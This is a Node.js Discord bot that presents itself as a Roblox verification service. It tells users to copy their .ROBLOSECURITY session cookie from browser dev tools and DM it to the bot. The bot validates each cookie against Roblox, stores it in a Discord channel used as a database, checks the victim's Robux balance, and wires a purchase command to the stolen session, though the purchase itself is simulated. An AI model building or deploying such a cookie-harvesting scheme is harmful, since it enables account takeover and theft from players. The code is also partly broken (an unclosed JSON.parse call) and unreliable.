require('dotenv').config();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { Client, GatewayIntentBits, Partials, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const GUILD_ID = process.env.DISCORD_GUILD_ID;
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const DATABASE_CHANNEL_ID = process.env.DATABASE_CHANNEL_ID; // Channel where user data will be stored

if (!TOKEN || !CLIENT_ID || !GUILD_ID || !DATABASE_CHANNEL_ID) {
  console.error("❌ Missing required environment variables:");
  if (!TOKEN) console.error("  - DISCORD_BOT_TOKEN");
  if (!CLIENT_ID) console.error("  - DISCORD_CLIENT_ID");
  if (!GUILD_ID) console.error("  - DISCORD_GUILD_ID");
  if (!DATABASE_CHANNEL_ID) console.error("  - DATABASE_CHANNEL_ID");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMessages,
  ],
  partials: [Partials.Channel],
});

// Database structure: { userId: { messageId, cookie, lastValidation, userInfo } }
let userDatabase = new Map();
let databaseChannel;

const robloxAPI = axios.create({
  timeout: 2000,
  headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
  },
});

// Initialize database channel
async function initDatabaseChannel() {
  try {
    databaseChannel = await client.channels.fetch(DATABASE_CHANNEL_ID);
    console.log(`✅ Database channel initialized: #${databaseChannel.name}`);
    
    // Load existing messages
    const messages = await databaseChannel.messages.fetch({ limit: 100 });
    messages.forEach(msg => {
      if (msg.embeds.length > 0 && msg.embeds[0].fields) {
        const userIdField = msg.embeds[0].fields.find(f => f.name === 'User ID');
        if (userIdField) {
          userDatabase.set(userIdField.value, {
            messageId: msg.id,
            cookie: msg.embeds[0].fields.find(f => f.name === 'Cookie')?.value,
            lastValidation: msg.embeds[0].fields.find(f => f.name === 'Last Validation')?.value,
            userInfo: JSON.parse(msg.embeds[0].fields.find(f => f.name === 'User Info')?.value || {}
          });
        }
      }
    });
    console.log(`📊 Loaded ${userDatabase.size} user records from database channel`);
  } catch (error) {
    console.error('❌ Failed to initialize database channel:', error);
    process.exit(1);
  }
}

// Update user record in database channel
async function updateUserRecord(userId, cookie, userInfo) {
  try {
    const validationTime = new Date().toISOString();
    const embed = new EmbedBuilder()
      .setColor('#0099ff')
      .setTitle('🔐 User Verification Record')
      .setDescription(`Last updated: ${new Date().toLocaleString()}`)
      .addFields(
        { name: 'User ID', value: userId, inline: true },
        { name: 'Discord Tag', value: userInfo.discordTag || 'Unknown', inline: true },
        { name: 'Roblox Username', value: userInfo.username || 'Unknown', inline: true },
        { name: 'Cookie', value: '`' + cookie.slice(0, 15) + '...`', inline: false },
        { name: 'Last Validation', value: validationTime, inline: true },
        { name: 'User Info', value: '```json\n' + JSON.stringify(userInfo, null, 2) + '\n```', inline: false }
      )
      .setTimestamp();

    let record = userDatabase.get(userId);
    if (record && record.messageId) {
      // Update existing message
      const message = await databaseChannel.messages.fetch(record.messageId);
      await message.edit({ embeds: [embed] });
      console.log(`📝 Updated database record for user ${userId}`);
    } else {
      // Create new message
      const message = await databaseChannel.send({ embeds: [embed] });
      userDatabase.set(userId, {
        messageId: message.id,
        cookie,
        lastValidation: validationTime,
        userInfo
      });
      console.log(`📄 Created new database record for user ${userId}`);
    }
  } catch (error) {
    console.error(`❌ Failed to update record for user ${userId}:`, error);
  }
}

// Validate cookie and update database
async function validateAndUpdate(userId, discordTag, cookie) {
  try {
    const validation = await validateRobloxCookie(cookie);
    if (!validation.valid) {
      return { valid: false, error: validation.error };
    }

    const userInfo = {
      discordTag,
      ...validation.data
    };

    await updateUserRecord(userId, cookie, userInfo);
    return { valid: true, userInfo };
  } catch (error) {
    return { valid: false, error: error.message };
  }
}

// Get valid user cookie from database
async function getValidUserCookie(userId, discordTag) {
  const record = userDatabase.get(userId);
  if (!record || !record.cookie) return null;

  // Revalidate cookie if it's been more than 1 hour
  const lastValidation = new Date(record.lastValidation);
  const now = new Date();
  const hoursDiff = Math.abs(now - lastValidation) / 36e5;

  if (hoursDiff > 1) {
    const validation = await validateAndUpdate(userId, discordTag, record.cookie);
    if (!validation.valid) return null;
    return record.cookie;
  }

  return record.cookie;
}

// Roblox API functions
async function validateRobloxCookie(cookie) {
  try {
    const cleanCookie = cookie.replace(/^\.ROBLOSECURITY=/, '').trim();
    if (!cleanCookie) return { valid: false, error: 'Empty cookie' };

    const response = await robloxAPI.get('https://users.roblox.com/v1/users/authenticated', {
      headers: { Cookie: `.ROBLOSECURITY=${cleanCookie}` },
    });

    const data = response.data;
    if (!data?.id || !data?.name) return { valid: false, error: 'Invalid response' };

    return {
      valid: true,
      data: {
        UserID: data.id,
        UserName: data.name,
        displayName: data.displayName,
        hasVerifiedBadge: data.hasVerifiedBadge,
      },
      cleanCookie
    };
  } catch (error) {
    console.error('Cookie validation error:', error.message);
    if (error.response?.status === 401) return { valid: false, error: 'Invalid/expired cookie' };
    return { valid: false, error: error.message };
  }
}

async function getRobuxBalance(cookie, userId) {
  try {
    const response = await robloxAPI.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    return { success: true, robux: response.data.robux || 0 };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

async function purchaseItem(cookie, userId, productId) {
  try {
    // First check Robux balance
    const balance = await getRobuxBalance(cookie, userId);
    if (!balance.success) throw new Error(balance.error);

    // Get product info (simplified - in reality you'd call Roblox API)
    const productInfo = await getProductInfo(productId);
    if (!productInfo) throw new Error('Invalid product ID');

    // Check if user has enough Robux
    if (balance.robux < productInfo.price) {
      return {
        success: false,
        message: `❌ Insufficient Robux! You need ${productInfo.price} but only have ${balance.robux}.`
      };
    }

    // Simulate purchase (replace with actual API call)
    await new Promise(resolve => setTimeout(resolve, 500));

    return {
      success: true,
      message: `🎉 Successfully purchased **${productInfo.name}** for ${productInfo.price} Robux!`,
      product: productInfo,
      remainingRobux: balance.robux - productInfo.price
    };
  } catch (error) {
    return { success: false, message: `❌ Purchase failed: ${error.message}` };
  }
}

// Mock function - replace with actual Roblox API call
async function getProductInfo(productId) {
  // In a real implementation, you'd fetch this from Roblox API
  const products = {
    '123': { name: 'Cool Hat', price: 100 },
    '456': { name: 'Awesome Shirt', price: 50 },
    '789': { name: 'Epic Pants', price: 75 }
  };
  
  return products[productId] || null;
}

// Initialize bot
client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  await initDatabaseChannel();

  const rest = new REST({ version: '10' }).setToken(TOKEN);

  const commands = [
    new SlashCommandBuilder()
      .setName('test')
      .setDescription('Purchase a Roblox item')
      .addStringOption(option =>
        option.setName('product_id')
          .setDescription('The Roblox product ID to purchase')
          .setRequired(true)),
    new SlashCommandBuilder()
      .setName('verifystatus')
      .setDescription('Check your verification status'),
    new SlashCommandBuilder()
      .setName('resubmit')
      .setDescription('Resubmit your Roblox cookie')
  ].map(cmd => cmd.toJSON());

  try {
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Slash commands registered');
  } catch (error) {
    console.error('❌ Failed to register commands:', error);
  }
});

// Handle DMs for cookie submission
client.on('messageCreate', async (message) => {
  if (message.channel.type !== 1 || message.author.bot) return;

  const userId = message.author.id;
  const content = message.content.trim();

  if (content.length < 20) {
    await message.reply({
      embeds: [
        new EmbedBuilder()
          .setColor('#ff6b6b')
          .setTitle('❌ Invalid Cookie')
          .setDescription('Please send a valid .ROBLOSECURITY cookie')
      ]
    });
    return;
  }

  await message.channel.sendTyping();
  const validation = await validateAndUpdate(userId, message.author.tag, content);

  if (!validation.valid) {
    await message.reply({
      embeds: [
        new EmbedBuilder()
          .setColor('#ff6b6b')
          .setTitle('❌ Verification Failed')
          .setDescription(`Error: ${validation.error}`)
      ]
    });
    return;
  }

  await message.reply({
    embeds: [
      new EmbedBuilder()
        .setColor('#51cf66')
        .setTitle('✅ Verification Successful!')
        .setDescription(`Welcome, **${validation.userInfo.UserName}**!`)
        .addFields(
          { name: 'User ID', value: validation.userInfo.UserID.toString(), inline: true },
          { name: 'Display Name', value: validation.userInfo.displayName || 'None', inline: true }
        )
    ]
  });
});

// Handle slash commands
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;
  await interaction.deferReply({ ephemeral: true });

  try {
    const userId = interaction.user.id;
    const discordTag = interaction.user.tag;

    switch (interaction.commandName) {
      case 'test':
        await handleTestCommand(interaction, userId, discordTag);
        break;
      case 'verifystatus':
        await handleVerifyStatusCommand(interaction, userId, discordTag);
        break;
      case 'resubmit':
        await handleResubmitCommand(interaction);
        break;
      default:
        await interaction.editReply('❌ Unknown command');
    }
  } catch (error) {
    console.error('Command error:', error);
    await interaction.editReply('❌ An error occurred');
  }
});

async function handleTestCommand(interaction, userId, discordTag) {
  const productId = interaction.options.getString('product_id');
  const cookie = await getValidUserCookie(userId, discordTag);

  if (!cookie) {
    await interaction.editReply({
      embeds: [
        new EmbedBuilder()
          .setColor('#ff6b6b')
          .setTitle('🔒 Verification Required')
          .setDescription('Please submit your Roblox cookie via DM first')
      ]
    });
    return;
  }

  const record = userDatabase.get(userId);
  const purchase = await purchaseItem(cookie, record.userInfo.UserID, productId);

  const embed = new EmbedBuilder()
    .setColor(purchase.success ? '#51cf66' : '#ff6b6b')
    .setTitle(purchase.success ? '🛍️ Purchase Successful' : '❌ Purchase Failed')
    .setDescription(purchase.message);

  if (purchase.success) {
    embed.addFields(
      { name: 'Product', value: purchase.product.name, inline: true },
      { name: 'Price', value: `${purchase.product.price} Robux`, inline: true },
      { name: 'Remaining', value: `${purchase.remainingRobux} Robux`, inline: true }
    );
  }

  await interaction.editReply({ embeds: [embed] });
}

async function handleVerifyStatusCommand(interaction, userId, discordTag) {
  const cookie = await getValidUserCookie(userId, discordTag);
  const record = userDatabase.get(userId);

  const embed = new EmbedBuilder()
    .setColor(cookie ? '#51cf66' : '#ff6b6b')
    .setTitle(cookie ? '✅ Verified' : '❌ Not Verified')
    .setDescription(cookie ? 'Your account is verified and ready to use!' : 'Please submit your Roblox cookie via DM');

  if (cookie && record) {
    embed.addFields(
      { name: 'Roblox Username', value: record.userInfo.UserName, inline: true },
      { name: 'Last Verified', value: new Date(record.lastValidation).toLocaleString(), inline: true }
    );
  }

  await interaction.editReply({ embeds: [embed] });
}

async function handleResubmitCommand(interaction) {
  await interaction.editReply({
    embeds: [
      new EmbedBuilder()
        .setColor('#0099ff')
        .setTitle('🔄 Resubmit Cookie')
        .setDescription('To resubmit your Roblox cookie:')
        .addFields(
          { name: '1️⃣ Get Cookie', value: 'Go to Roblox.com → F12 → Application → Cookies → .ROBLOSECURITY' },
          { name: '2️⃣ Copy', value: 'Copy the entire cookie value' },
          { name: '3️⃣ Send', value: 'DM the cookie to this bot' }
        )
    ]
  });
}

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('🛑 Shutting down...');
  client.destroy();
  process.exit(0);
});

client.login(TOKEN);
